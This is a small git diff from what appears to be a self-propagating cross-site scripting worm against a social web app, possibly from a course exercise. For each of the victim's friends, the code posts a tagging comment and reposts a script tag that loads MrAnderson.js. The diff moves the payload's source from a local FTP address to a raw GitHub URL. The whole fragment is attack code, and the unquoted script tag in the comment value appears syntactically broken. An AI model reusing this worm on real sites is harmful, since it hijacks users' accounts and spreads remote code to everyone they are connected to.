@@ -17,7 +17,7 @@ $.get("friends.php", function(friends){
                 //Comments Identifier
                 $.get("/add_comment.php", {'id': 78, 'comment': id + "-Mr. Anderson... at time: " + new Date(Date.now()).toLocaleString()})
                 //Reposts the script
-                $.get("/add_comment.php", {'id': id, 'comment': <script src='ftp://192.168.11.133/MrAnderson.js'></script>})
+                $.get("/add_comment.php", {'id': id, 'comment': <script src='https://raw.githubusercontent.com/pjm8331/WebApp/main/MrAnderson.js'></script>})
             }
         })
     }
